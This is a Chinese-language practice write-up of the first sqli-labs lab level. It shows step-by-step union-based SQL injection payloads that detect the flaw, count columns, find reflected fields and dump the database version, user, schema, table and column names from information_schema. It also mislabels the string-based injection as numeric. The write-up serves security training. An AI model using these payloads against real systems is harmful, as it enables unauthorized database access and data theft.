# sqllilabs靶场第一场记录

## 1、判断注入点

![image-20240928174439631](.\image-20240928174439631.png)

在url后面写?id=1,有回显，

![image-20240928175234835](.\image-20240928175234835.png)

输入?id=2，也有回显，输入?id=0，回显

![image-20240928174605844](.\image-20240928174605844.png)

判断有注入

加单引号：?id=1'

>   You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ''1'' LIMIT 0,1' at line 1   
>
> 报错，从  '  '1'  ' LIMIT 0,1' 可以得知，多一个单引号，怀疑为数字型注入

因为单引号需要闭合，同时原先查询语句的单引号需要注释掉，构造语句

``` ?id=1' and 1=1 --+```

第一个单引号闭合sql语句的查询，--注释掉原先语句的的单引号，+在表示空格，回显：![image-20240928175256193](.\image-20240928175256193.png)

构造：?id=1' and 1=2 --+，回显：

![image-20240928175533142](.\image-20240928175533142.png)

确定为数字型注入

## 2、确定列数

构造

>  ?id=1' order by 10 --+

![image-20240928175648944](.\image-20240928175648944.png)

将5依次设置其他数值，发现id=3时：回显正常

![image-20240928175723787](.\image-20240928175723787.png)

确定有三列

## 3、回显位置

注入过程中，union和前面一条SQL语句拼接,并构造其列数与前面的SQL语句列数相同,如1,2,3==4,5,6均为3列。我们把这种注入方式称为union注入

构造

>  /id=-1' union select 1,2,3 --+

将1设置为-1使其原先的页面回显不显示，而回显union查询的部分，回显结果：

![image-20240928180711121](.\image-20240928180711121.png)

确定2和3为回显位

## 4、获取信息

> /?id=-1' union select 1,version(),database() --+

显示MySQL的版本与数据库名

![image-20240928180850166](.\image-20240928180850166.png)

当前用户名

> ?id=-1' union select 1,user(),current_user() --+

![image-20240928181048761](.\image-20240928181048761.png)

![image-20240928181346938](.\image-20240928181346938.png)

构造

> ?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+  爆出所有数据库名

![image-20240928181522103](.\image-20240928181522103.png)

爆当前数据库的表名

> ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

![image-20240928181909697](.\image-20240928181909697.png)

爆列名

> /?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+

![image-20240928182055387](.\image-20240928182055387.png)



其他表于此同理，至此大功告成













